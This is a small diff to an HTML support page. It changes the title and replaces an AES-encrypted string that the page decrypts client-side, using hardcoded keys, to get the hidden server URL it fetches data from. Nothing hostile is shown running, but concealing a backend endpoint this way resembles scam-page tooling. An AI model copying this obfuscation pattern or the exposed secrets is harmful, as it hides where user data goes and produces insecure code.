@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Support</title>
+  <title>Support-D</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
   <style>
     * { box-sizing: border-box; }
@@ -254,7 +254,7 @@
   <script>
     const PASSPHRASE = "98yNCjeAfWMwk0wI";  
     const URL_KEY = "UrLk3yShopEase01";
-    const ENC_DATA_ORIGIN = "U2FsdGVkX19WdeWIW+JjOZDd/ARDDoB0HqxpxoffIe0gnt6Af64Ylaqb2dB5VfYevkxwmrWoWT60lhhX3+OeNg==";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1/NKIO5oc6SMn+uCqFhAnjaUUgpVkmwSrHkalnxnBqLB8FJBiI/NJcq";
     const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
     const DATA_URL = DATA_ORIGIN + "/data";
     let lastUrl = null;
